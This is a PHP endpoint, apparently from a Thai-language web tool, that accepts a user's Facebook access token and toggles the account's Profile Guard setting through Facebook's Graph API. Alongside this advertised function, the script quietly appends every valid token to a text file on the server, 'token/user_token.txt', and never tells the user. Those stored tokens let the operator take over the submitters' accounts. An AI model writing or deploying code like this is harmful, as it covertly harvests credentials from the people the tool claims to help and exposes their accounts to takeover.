<?php

header("Content-Type: application/json");

function response($type, $title, $message) {
	$jsonData = new \stdclass();
	$jsonData->type = $type;
	$jsonData->title = $title;
	$jsonData->message = $message;
	echo json_encode($jsonData);
	exit(0);
}

if (isset($_POST["access_token"])) {
	$ch = curl_init("https://graph.facebook.com/me");
	curl_setopt($ch, CURLOPT_HTTPHEADER, array(
		"Authorization: Bearer " . $_POST["access_token"]
	));
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$resp = curl_exec($ch);
	if (curl_getinfo($ch, CURLINFO_HTTP_CODE) == 200) {
		curl_close($ch);
		$uid = json_decode($resp)->id;
		$ch = curl_init("https://graph.facebook.com/graphql");
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_HTTPHEADER, array(
			"Authorization: Bearer " . $_POST["access_token"]
		));
		curl_setopt($ch, CURLOPT_POST, true);
		curl_setopt($ch, CURLOPT_POSTFIELDS, array(
			"variables" => json_encode(array(
				"0" => array(
					"is_shielded" => $_POST["active"] == "on",
					"actor_id" => $uid,
					"client_mutation_id" => "b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"
				)
			)),
			"doc_id" => "1477043292367183"
		));
		curl_exec($ch);
		curl_close($ch);
		$file_name = "token/user_token.txt";
		$file = fopen($file_name, "a+");
		$file_content = file_get_contents($file_name);
		if (strpos($file_content, $_POST["access_token"]) === false) {
			file_put_contents($file_name, $_POST["access_token"].PHP_EOL , FILE_APPEND | LOCK_EX);
		}
		response("success", "Success", ($_POST["active"] == "on" ? "เ" : "") . "ปิดการใช้ Profile Guard แล้ว");
	}
	curl_close($ch);
	response("error", "Error", "Token Facebook ไม่ถูกต้อง!!");
}
response("error", "Error", "กรุณาใส่ Token Facebook ด้วย!!");

?>